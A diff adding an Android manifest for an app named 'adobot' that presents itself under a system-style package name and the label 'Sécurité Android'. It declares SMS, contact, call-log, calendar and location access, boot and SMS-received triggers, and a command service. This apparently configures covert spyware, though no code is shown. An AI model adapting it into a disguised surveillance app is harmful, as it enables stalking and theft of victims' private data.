@@ -1,0 +1,54 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.android.adobot">
+
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" android:required="true" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" android:required="true" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" android:required="true" />
+    <uses-permission android:name="android.permission.INTERNET" android:required="true" />
+    <uses-permission android:name="android.permission.READ_SMS" android:required="true" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" android:required="true" />
+    <uses-permission android:name="android.permission.WRITE_CONTACTS" android:required="true" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" android:required="true" />
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG" android:required="true" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" android:required="true" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:required="true" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" android:required="true"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" android:required="true"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" android:required="true"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" android:required="true"/>
+    <uses-permission android:name="android.permission.BATTERY_STATS" android:required="true"/>
+    <uses-permission android:name="android.permission.READ_CALENDAR" android:required="true"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS" android:required="true"/>
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="Sécurité Android"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme">
+        <activity android:name="com.android.adobot.activities.SetupActivity" android:noHistory="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity android:name="com.android.adobot.activities.UpdateActivity"></activity>
+        <activity android:name="com.android.adobot.activities.PermissionsActivity"></activity>
+
+        <receiver android:name="com.android.adobot.NetworkWatcher">
+            <intent-filter android:priority="1000">
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <service android:name="com.android.adobot.CommandService" />
+    </application>
+</manifest>
